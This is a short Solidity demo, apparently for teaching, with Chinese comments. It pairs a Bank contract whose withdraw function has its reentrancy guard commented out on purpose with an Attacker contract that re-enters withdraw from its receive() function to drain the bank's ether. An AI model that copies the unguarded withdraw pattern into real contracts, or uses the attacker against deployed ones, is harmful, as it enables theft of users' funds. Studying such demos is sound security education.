// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "hardhat/console.sol";

// solidity必须小于0.8.0才能使用该demo
// 因为solidity0.8.0整型溢出时会revert
contract Bank {
    // uint8 private _status;

    mapping(address => uint) balances;

    constructor() payable {}

    // modifier nonReentrant() {
    //     require(_status == 0, "Reentrant call");
    //      _status = 1;

	//     _;
    
	//     _status = 0;
    // }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // function withdraw(uint val) external nonReentrant {
    function withdraw(uint val) external {
        require(val <= balances[msg.sender], "Insufficient balance");
        (bool success, ) = msg.sender.call{value: val}("");
        if (success) {
            console.log('withdraw successfully');
        }
        require(success, "Failed to withdraw");
        // 0.8.0会因为整型溢出而revert
        balances[msg.sender] -= val;
    }
}

contract Attacker {
    Bank bank;

    constructor(address attacked) payable {
        bank = Bank(attacked);
    }

    function attack() external {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    receive() external payable {
        console.log('receive');
        if (address(bank).balance > 1 ether) {
            bank.withdraw(1 ether);
        }
    }
}
